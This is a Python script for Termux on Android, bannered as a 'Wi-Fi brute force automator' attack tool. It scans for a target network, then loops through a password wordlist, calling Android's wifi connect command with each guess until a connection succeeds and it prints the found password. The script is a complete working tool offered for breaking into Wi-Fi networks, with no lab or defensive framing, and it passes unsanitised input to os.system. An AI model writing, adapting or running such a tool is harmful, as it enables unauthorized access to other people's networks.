import os
import time
import subprocess
import json

# ANSI Color Codes for Terminal Output
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'
BOLD = '\033[1m'
BLUE = '\033[94m'

def banner():
    # Clear screen for a professional look
    os.system('clear')
    print(f"{RED}{BOLD}" + "="*45)
    print("        WI-FI BRUTE FORCE AUTOMATOR")
    print("="*45 + f"{RESET}")
    print(f"      {GREEN}A Attack Tool By Bayazid Habib{RESET}")
    print(f"      {BLUE}Status: Termux-API Engine Active{RESET}\n")

def check_ssid_availability(target_ssid):
    # Scan nearby networks using Termux-API
    print(f"[*] Scanning for SSID: {target_ssid}...")
    try:
        # Directly using termux-wifi-scaninfo
        scan_output = subprocess.check_output('termux-wifi-scaninfo', shell=True).decode()
        
        if target_ssid in scan_output:
            print(f"{GREEN}[+] SSID '{target_ssid}' is in range.{RESET}")
            return True
        else:
            print(f"{RED}[!] Error: SSID '{target_ssid}' not found nearby!{RESET}")
            return False
    except Exception:
        print(f"{RED}[-] Scan failed! Ensure Termux-API is installed and Location is ON.{RESET}")
        return False

def get_wordlist_path():
    # Input for wordlist file path
    path = input(f"{BOLD}[+] Enter Wordlist Path (e.g., wordlist.txt): {RESET}")
    if os.path.exists(path):
        return path
    return None

def attack():
    banner()
    
    while True:
        cmd_input = input(f"{BOLD}Type 'attack' to start: {RESET}").lower()
        if cmd_input == "attack":
            break

    ssid = input("[+] Target WiFi SSID: ")
    
    if not check_ssid_availability(ssid):
        return

    wordlist_path = get_wordlist_path()
    if not wordlist_path:
        print(f"{RED}[-] Wordlist file missing!{RESET}")
        return

    try:
        with open(wordlist_path, 'r') as f:
            lines = f.readlines()
            total_pass = len(lines)
            
            print(f"\n{GREEN}[*] Attack Started on: {ssid}{RESET}")
            
            for index, line in enumerate(lines, 1):
                password = line.strip()
                # WiFi passwords must be at least 8 characters long
                if len(password) < 8: continue
                
                print(f"[*] Testing [{index}/{total_pass}]: {password}", end='\r')
                
                # Using direct Android CMD instead of Shizuku/rish
                command = f'cmd wifi connect-with-pass "{ssid}" "{password}"'
                status = os.system(command)
                
                # Brief pause for connection initiation
                time.sleep(3)
                
                # Verification of connection status
                try:
                    check_conn = subprocess.check_output('termux-wifi-connectioninfo', shell=True).decode()
                    if ssid in check_conn and "ip_address" in check_conn:
                        print(f"\n\n{GREEN}{BOLD}[+] SUCCESS! Found Password: {password}{RESET}")
                        return
                except:
                    pass
                
    except KeyboardInterrupt:
        print(f"\n{RED}[!] Process terminated by user.{RESET}")

if __name__ == "__main__":
    attack()
